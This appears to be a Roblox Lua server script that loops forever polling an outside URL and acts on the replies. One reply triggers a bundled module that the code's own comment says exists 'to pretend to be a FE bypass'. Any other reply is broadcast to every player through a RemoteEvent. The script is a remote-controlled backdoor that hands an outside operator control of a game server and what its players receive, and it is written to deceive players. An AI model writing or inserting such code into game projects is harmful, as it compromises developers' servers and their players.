local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

function get()
	return game:GetService("HttpService"):GetAsync("ServerURLHere?"..tick())
end

local remoteEvent = game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
repeat
	data = get()
	if data == 'IYSS' then
		require(script.IY)() -- Run a serverside script to pretend to be a FE bypass
	elseif data ~= '' and data ~= 'IYSS' then
		for i, player in Players:GetPlayers() do
			remoteEvent:FireClient(player, data)
		end
	end
	task.wait()
until nil